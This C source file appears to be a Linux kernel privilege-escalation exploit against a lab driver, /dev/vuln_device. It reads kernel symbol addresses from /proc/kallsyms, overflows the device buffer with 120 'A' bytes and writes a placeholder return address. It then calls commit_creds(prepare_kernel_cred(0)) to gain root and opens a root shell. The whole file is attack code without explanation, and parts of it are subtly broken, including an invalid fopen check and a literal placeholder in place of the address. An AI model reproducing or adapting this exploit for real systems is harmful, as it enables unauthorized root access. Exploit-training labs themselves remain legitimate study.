#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

int fd_device_global;

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

// Parse kernel symbols /proc/kallsyms
unsigned long kallsym_getaddr(const char* str)
{
    FILE *stream;
    char fbuf[256];
    char addr[32];
 
    stream = fopen("/proc/kallsyms","r");
    if(stream < 0)
    {
        printf("failed to open /proc/kallsyms\n");
        return 0;
    }
 
    memset(fbuf,0x00,sizeof(fbuf));
     
    while(fgets(fbuf,256,stream) != NULL)
    {
        char *p = fbuf;
        char *a = addr;
 
        if(strlen(fbuf) == 0)
            continue;
 
        memset(addr,0x00,sizeof(addr));
        fbuf[strlen(fbuf)-1] = '\0';
 
        while(*p != ' ')
            *a++ = *p++;
 
        p+=3;
    if(!strcmp(p,str))
            return strtoul(addr, NULL, 16);
    }
    return 0;
}

void get_shell()
{    

    if (getuid() == 0){
        printf("[+] Root shell success !! :)\n");
        system("/bin/sh");
    }
    printf("[-] failed to get root shell :(\n");
}

void open_fd_device(void)
{
    fd_device_global = open("/dev/vuln_device", O_RDWR);
    if(fd_device_global < 0) {
        printf("Error opening file desc\n");
        exit(-1);
    } else {
        printf("File desc open :)\n");
    }
}

void escalate_privs(void){
    commit_creds(prepare_kernel_cred(0));
}

int main(void)
{
    char buffer[64];
    
    commit_creds = kallsym_getaddr("commit_creds");
    prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred");
    open_fd_device();
    for(int i = 1; i <= 120; i++) {
        write(fd_device_global, "A", 1);
    }

    write(fd_device_global, "<addr escalate function>", 4);  // change addr function
    read(fd_device_global, buffer, 64);
    get_shell();
    return(0);
}
